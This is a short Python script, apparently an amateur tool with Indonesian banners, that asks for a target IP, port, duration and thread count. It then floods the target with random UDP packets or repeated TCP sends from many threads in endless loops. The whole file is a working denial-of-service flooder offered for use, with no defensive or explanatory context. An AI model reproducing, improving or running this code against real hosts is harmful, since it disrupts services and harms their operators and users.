#!/usr/bin/env python3
import random
import socket
import threading
#14B600
print       (" - - > AAN NIH BOSS ! < - - ")
print       (" - - > NO KOMUNITY <- - ")                                   
print       (" - - > NO PROBLEM !! < - - ")
print       (" - - > BITIES PLASTIK < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" PENCET Y (y/n):"))
times = int(input(" DURASI/JAM :"))
threads = int(input(" ISI PAKET:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[P]","[P]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" AAN NIH BOSS ")
		except:
			print("[!] K.O")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" AAN NIH BOSS  ")
		except:
			s.close()
			print("[*] K.O")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()